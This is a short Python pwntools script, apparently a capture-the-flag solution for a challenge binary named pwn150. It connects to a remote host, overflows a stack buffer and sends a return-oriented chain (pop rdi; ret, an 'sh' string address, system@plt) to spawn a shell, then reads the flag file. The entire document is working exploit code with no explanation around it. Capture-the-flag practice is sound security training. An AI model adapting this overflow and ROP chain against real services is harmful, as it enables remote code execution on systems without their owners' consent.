from pwn import *

server = "54.67.102.66"
port   =  5253

system_addr = 0x4005e0

p = remote(server, port)
e = ELF("./pwn150")

pr = 0x400882
sh = 0x6003ef
pop_rdi_ret = 0x400883

print p.recv()

payload = ""
payload += "A" * 0x50
payload += "B" * 8 # rbp
payload += p64(pop_rdi_ret)
payload += p64(sh)
payload += p64(e.plt["system"])

p.sendline(payload)
p.sendline("cat /home/pwn150/flag")
print p.recv()
print p.recv()
